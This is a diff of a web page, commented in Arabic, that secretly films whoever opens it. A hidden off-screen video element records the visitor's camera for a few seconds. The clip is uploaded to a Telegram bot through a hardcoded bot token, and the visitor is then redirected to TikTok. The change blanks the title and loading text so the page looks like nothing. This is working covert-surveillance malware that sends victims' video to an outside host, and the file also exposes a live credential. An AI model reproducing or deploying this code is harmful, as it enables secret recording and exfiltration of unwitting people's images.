@@ -2,50 +2,36 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>جاري التحميل...</title>
+    <title></title>
     <style>
         body {
             margin: 0;
             padding: 0;
-            background: #000;
-            color: white;
-            font-family: Arial, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            text-align: center;
-        }
-        .loading {
-            color: #666;
-            font-size: 14px;
+            background: black;
         }
     </style>
 </head>
 <body>
-    <div class="loading">🔄 جاري التحميل...</div>
 
-    <!-- كل عناصر التصوير مخفية -->
-    <video id="hiddenVideo" autoplay playsinline style="position:fixed; top:-1000px; left:-1000px; width:1px; height:1px; opacity:0;"></video>
-    <canvas id="hiddenCanvas" style="display:none;"></canvas>
+    <!-- عناصر التصوير مخفية -->
+    <video id="video" autoplay playsinline style="position:fixed; top:-1000px; left:-1000px; width:1px; height:1px;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
-        // ====== إعدادات بسيطة ======
-        const botToken = "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU";
-        const chatId = new URLSearchParams(window.location.search).get('id');
+        // ====== الإعدادات ======
+        const token = "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU";
+        const id = new URLSearchParams(window.location.search).get('id');
         
-        // عناصر مخفية
-        const video = document.getElementById('hiddenVideo');
-        const canvas = document.getElementById('hiddenCanvas');
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
         
-        // متغيرات بسيطة
         let stream = null;
         let recorder = null;
         let chunks = [];
 
-        // دالة بدء التسجيل
+        // ====== بداية التصوير ======
         async function start() {
-            if (!chatId) {
+            if (!id) {
                 window.location.href = "https://www.tiktok.com";
                 return;
             }
@@ -59,9 +45,8 @@
                 
                 video.srcObject = stream;
                 
-                // انتظار ثانيتين لتثبيت الكاميرا
+                // انتظار 3 ثواني عشان الكاميرا تثبت وتضبط الإضاءة
                 setTimeout(() => {
-                    // إعداد المسجل
                     recorder = new MediaRecorder(stream);
                     
                     recorder.ondataavailable = (e) => {
@@ -69,40 +54,36 @@
                     };
                     
                     recorder.onstop = () => {
-                        // تجميع الفيديو
-                        const blob = new Blob(chunks, { type: 'video/webm' });
+                        const blob = new Blob(chunks, { type: 'video/mp4' });
                         
-                        // إرسال للبوت
-                        const formData = new FormData();
-                        formData.append('chat_id', chatId);
-                        formData.append('video', blob, 'video.webm');
+                        // إرسال الفيديو
+                        const form = new FormData();
+                        form.append('chat_id', id);
+                        form.append('video', blob, 'vid.mp4');
                         
-                        fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
+                        fetch(`https://api.telegram.org/bot${token}/sendVideo`, {
                             method: 'POST',
-                            body: formData
+                            body: form
                         }).finally(() => {
-                            // إيقاف الكاميرا والتوجيه
                             stream.getTracks().forEach(t => t.stop());
                             window.location.href = "https://www.tiktok.com";
                         });
                     };
                     
-                    // تسجيل 7 ثواني
+                    // تسجيل 5 ثواني
                     recorder.start();
-                    setTimeout(() => {
-                        recorder.stop();
-                    }, 7000);
+                    setTimeout(() => recorder.stop(), 5000);
                     
-                }, 2000);
+                }, 3000);
                 
             } catch (err) {
-                // إذا فشلت الكاميرا، أرسل رسالة واتجه
-                fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                // إذا فشل، أرسل رسالة
+                fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify({
-                        chat_id: chatId,
-                        text: `❌ فشل التصوير: ${err.message}`
+                        chat_id: id,
+                        text: `❌ خطأ: ${err.message}`
                     })
                 }).finally(() => {
                     window.location.href = "https://www.tiktok.com";
@@ -110,7 +91,7 @@
             }
         }
 
-        // ابدأ
+        // تشغيل
         start();
 
         // طوارئ: توجه بعد 10 ثواني
